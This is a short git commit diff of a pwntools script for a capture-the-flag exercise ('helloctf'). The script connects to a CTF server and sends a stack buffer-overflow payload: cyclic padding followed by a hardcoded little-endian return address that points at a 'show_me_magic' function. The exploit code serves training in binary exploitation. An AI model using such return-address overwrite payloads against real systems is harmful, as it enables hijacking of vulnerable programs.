5be2289586fc64e95dbd89432070f648963cc9b0
wuling31715 <wuling31715@gmail.com>
2020-04-12 14:41:38 +0800

    .

--- adl/helloctf/main.py
+++ adl/helloctf/main.py
@@ -7,10 +7,9 @@ ip = 'ctf.adl.tw'
 port = 11001
 
 r = remote(ip, port)
-show_me_magic = 0x0000000000400627
-
-payload = "aaaabaaacaaadaaaeaaafaaa"
+# show_me_magic = 0x0000000000400627
 # payload += p64(show_me_magic)
+payload = "aaaabaaacaaadaaaeaaafaaa"
 # little endian:
 payload += "\x27\x06\x40\x00\x00\x00\x00\x00"
 
